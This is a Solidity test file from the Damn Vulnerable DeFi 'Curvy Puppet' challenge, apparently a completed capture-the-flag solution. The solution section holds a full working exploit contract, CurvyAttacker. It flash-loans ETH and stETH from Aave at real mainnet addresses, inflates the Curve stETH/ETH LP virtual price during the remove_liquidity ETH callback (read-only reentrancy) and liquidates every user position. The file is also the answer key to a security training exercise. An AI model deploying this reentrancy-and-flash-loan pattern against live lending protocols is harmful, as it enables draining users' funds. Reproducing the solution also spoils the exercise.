// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     *
     * Aegis class: SC03/SC08 read-only reentrancy (the Curve `get_virtual_price` family).
     *
     * The lender prices the BORROW asset (Curve stETH/ETH LP) as
     *   oracle(ETH) * curvePool.get_virtual_price()
     * and `get_virtual_price()` is NOT protected by the pool's reentrancy lock. During
     * `remove_liquidity`, the pool burns the LP and sends ETH (coin0) to the receiver BEFORE
     * sending stETH (coin1), so mid-callback the invariant D is computed over a still-full stETH
     * balance against an already-reduced supply -> get_virtual_price spikes. We balloon the pool
     * with flash-loaned ETH+stETH, then in the ETH callback (vp ~4.3x) every user position is
     * suddenly underwater and we liquidate all three. Flash funds are repaid same-asset; the
     * treasury's WETH buffer absorbs the Aave premiums + Curve fee.
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        CurvyAttacker attacker = new CurvyAttacker(
            lending, curvePool, address(permit2), curvePool.lp_token(), address(dvt), treasury,
            [alice, bob, charlie]
        );

        // Treasury approved the *player* for these — pull them and hand them to the attacker.
        weth.transferFrom(treasury, address(attacker), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(attacker), TREASURY_LP_BALANCE);

        uint256 ethFlash = 80_000e18;
        uint256 wstFlash = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0).getWstETHByStETH(220_000e18);
        attacker.attack(ethFlash, wstFlash);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

interface IAavePool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint256) external;
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IWstETH {
    function wrap(uint256) external returns (uint256);
    function unwrap(uint256) external returns (uint256);
    function getStETHByWstETH(uint256) external view returns (uint256);
    function getWstETHByStETH(uint256) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ILido {
    function submit(address) external payable returns (uint256);
}

/**
 * @notice Read-only-reentrancy liquidator. One `attack()` call: flash-loan ETH+stETH, inflate the
 *         Curve LP virtual price mid-`remove_liquidity`, liquidate all three positions in the ETH
 *         callback, repay, and hand the spoils to the treasury.
 */
contract CurvyAttacker {
    address constant AAVE = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant WETH9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    CurvyPuppetLending immutable lending;
    IStableSwap immutable pool;
    address immutable permit2;
    address immutable lpToken;
    address immutable dvt;
    address immutable treasury;
    address[3] victims;

    bool inRemove;

    constructor(
        CurvyPuppetLending _lending,
        IStableSwap _pool,
        address _permit2,
        address _lpToken,
        address _dvt,
        address _treasury,
        address[3] memory _victims
    ) {
        lending = _lending;
        pool = _pool;
        permit2 = _permit2;
        lpToken = _lpToken;
        dvt = _dvt;
        treasury = _treasury;
        victims = _victims;
    }

    function attack(uint256 ethFlash, uint256 wstFlash) external {
        address[] memory assets = new address[](2);
        assets[0] = WETH9;
        assets[1] = WSTETH;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = ethFlash;
        amounts[1] = wstFlash;
        uint256[] memory modes = new uint256[](2); // 0 = no debt, full repay

        IAavePool(AAVE).flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        // Hand everything to the treasury; player stays clean.
        IERC20(dvt).transfer(treasury, IERC20(dvt).balanceOf(address(this)));               // exactly 7500 DVT
        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this)));        // ~3.5 LP back
        if (address(this).balance > 0) IWETH9(WETH9).deposit{value: address(this).balance}();
        IWETH9(WETH9).transfer(treasury, IWETH9(WETH9).balanceOf(address(this)));            // leftover WETH buffer
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == AAVE, "!aave");
        uint256 ethFlash = amounts[0];
        uint256 wstFlash = amounts[1];

        // Convert flash assets to native ETH + stETH.
        IWETH9(WETH9).withdraw(ethFlash);
        IWstETH(WSTETH).unwrap(wstFlash);
        uint256 stBal = IERC20(STETH).balanceOf(address(this));

        // Balloon the pool (balanced-ish, stETH-heavy) so we own the lion's share of LP.
        IERC20(STETH).approve(address(pool), type(uint256).max);
        uint256[2] memory addAmts = [ethFlash, stBal];
        uint256 minted = pool.add_liquidity{value: ethFlash}(addAmts, 0);

        // Pre-authorize permit2 so the lender can pull our LP during the reentrant liquidations.
        IERC20(lpToken).approve(permit2, type(uint256).max);
        IPermit2(permit2).approve(lpToken, address(lending), uint160(10e18), uint48(block.timestamp + 1));

        // Remove it all — the ETH callback (receive) liquidates while vp is inflated.
        inRemove = true;
        uint256[2] memory minOut = [uint256(0), uint256(0)];
        pool.remove_liquidity(minted, minOut);
        inRemove = false;

        // ---- Repay ----
        uint256 wstOwed = wstFlash + premiums[1];
        uint256 stNeeded = IWstETH(WSTETH).getStETHByWstETH(wstOwed) + 1e15;
        uint256 stHave = IERC20(STETH).balanceOf(address(this));
        if (stHave < stNeeded) {
            ILido(STETH).submit{value: stNeeded - stHave}(address(0)); // ETH -> stETH 1:1
        }
        IERC20(STETH).approve(WSTETH, type(uint256).max);
        IWstETH(WSTETH).wrap(stNeeded); // -> >= wstOwed wstETH

        uint256 wethOwed = ethFlash + premiums[0];
        uint256 wethHave = IWETH9(WETH9).balanceOf(address(this));
        if (wethHave < wethOwed) {
            IWETH9(WETH9).deposit{value: wethOwed - wethHave}();
        }

        IWETH9(WETH9).approve(AAVE, wethOwed);
        IWstETH(WSTETH).approve(AAVE, wstOwed);
        return true;
    }

    receive() external payable {
        if (inRemove) {
            inRemove = false; // only fire once, on the remove_liquidity ETH leg
            lending.liquidate(victims[0]);
            lending.liquidate(victims[1]);
            lending.liquidate(victims[2]);
        }
    }
}
